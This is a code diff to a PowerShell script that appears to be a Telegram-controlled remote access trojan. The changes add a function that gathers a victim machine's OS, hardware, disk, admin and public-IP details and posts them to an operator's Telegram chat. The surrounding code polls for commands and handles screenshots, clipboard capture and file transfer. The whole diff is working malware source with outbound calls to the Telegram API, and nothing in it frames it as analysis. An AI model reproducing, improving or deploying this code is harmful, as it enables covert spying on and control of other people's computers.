@@ -17,9 +17,21 @@ $api_file_dl   = "https://api.telegram.org/file/bot$api_token/"
 $api_upload    = "$api_base/sendDocument?chat_id=$telegram_id"
 
 
+function SendRaw($text) {
+    $escaped = $text -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
+    $body = @{
+        chat_id    = $telegram_id
+        parse_mode = "MarkdownV2"
+        text       = "``````$escaped``````"
+    } | ConvertTo-Json
+
+    try { Invoke-RestMethod -Method Post -Uri $api_send -Body $body -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null }
+    catch { Start-Sleep -Seconds 3 }
+}
+
 function SendMessage($output, $cmd = "") {
     $escaped = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
-    $ip   = try { Invoke-RestMethod -Uri "ident.me" -WebSession $session -TimeoutSec 5 } catch { "unknown" }
+    $ip   = try { (Invoke-RestMethod -Uri "ipv4.ident.me" -WebSession $session -TimeoutSec 5).Trim() } catch { "unknown" }
     $path = ((Get-Location).Path).Replace("\", "/")
 
     $body = @{
@@ -67,23 +79,23 @@ function CheckAdmin {
     $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function GetConnectBanner {
-    $os      = Get-CimInstance Win32_OperatingSystem
-    $cpu     = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name.Trim()
-    $ram_total = [math]::Round($os.TotalVisibleMemorySize / 1MB, 1)
-    $ram_free  = [math]::Round($os.FreePhysicalMemory / 1MB, 1)
-    $ram_used  = [math]::Round($ram_total - $ram_free, 1)
-    $uptime  = (Get-Date) - $os.LastBootUpTime
+function SendConnectBanner {
+    $os         = Get-CimInstance Win32_OperatingSystem
+    $cpu        = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name.Trim()
+    $ram_total  = [math]::Round($os.TotalVisibleMemorySize / 1MB, 1)
+    $ram_free   = [math]::Round($os.FreePhysicalMemory / 1MB, 1)
+    $ram_used   = [math]::Round($ram_total - $ram_free, 1)
+    $uptime     = (Get-Date) - $os.LastBootUpTime
     $uptime_str = "{0}d {1}h {2}m" -f [int]$uptime.TotalDays, $uptime.Hours, $uptime.Minutes
-    $ip      = try { Invoke-RestMethod -Uri "ident.me" -WebSession $session -TimeoutSec 5 } catch { "unknown" }
-    $admin   = if (CheckAdmin) { "YES" } else { "NO" }
-    $disks   = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null } | ForEach-Object {
+    $ip         = try { (Invoke-RestMethod -Uri "ipv4.ident.me" -WebSession $session -TimeoutSec 5).Trim() } catch { "unknown" }
+    $admin      = if (CheckAdmin) { "YES" } else { "NO" }
+    $disks      = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null } | ForEach-Object {
         $free  = [math]::Round($_.Free / 1GB, 1)
         $total = [math]::Round(($_.Used + $_.Free) / 1GB, 1)
         "  $($_.Name):\ $free GB free / $total GB"
     }
 
-    @"
+    $banner = @"
 +----------------------------------+
 |        SESSION CONNECTED         |
 +----------------------------------+
@@ -101,6 +113,7 @@ function GetConnectBanner {
 $($disks -join "`n")
 +----------------------------------+
 "@
+    SendRaw $banner
 }
 
 function DownloadFile($file_id, $file_name) {
@@ -192,7 +205,7 @@ function HandleCommand($text, $document) {
         "exit"       { SendMessage "Session killed"; exit }
         "screenshot" { SendScreenshot; return }
         "admin"      { SendMessage (if (CheckAdmin) { "Admin: YES" } else { "Admin: NO" }); return }
-        "online"     { SendMessage (GetConnectBanner); return }
+        "online"     { SendConnectBanner; return }
         "clipboard"  { GetClipboard; return }
         "help"       { ShowHelp; return }
         "notify"     { SendNotification $arg; return }
@@ -233,12 +246,12 @@ function CommandListener {
 
             if ($offset -lt 0 -and $updates.result.Count -gt 0) {
                 $offset = $updates.result[-1].update_id + 1
-                SendMessage (GetConnectBanner)
+                SendConnectBanner
                 continue
             }
 
             if ($updates.result.Count -eq 0) {
-                if ($offset -lt 0) { SendMessage (GetConnectBanner); $offset = 0 }
+                if ($offset -lt 0) { SendConnectBanner; $offset = 0 }
                 continue
             }
 
@@ -258,7 +271,7 @@ function CommandListener {
                 $target = $parts[0]
                 $cmd    = if ($parts.Length -gt 1) { $parts[1] } else { "" }
 
-                if ($target -eq "/online") { SendMessage "Session active" $text; continue }
+                if ($target -eq "/online") { SendConnectBanner; continue }
                 if ($target -ne $session_id) { continue }
 
                 HandleCommand $cmd $doc
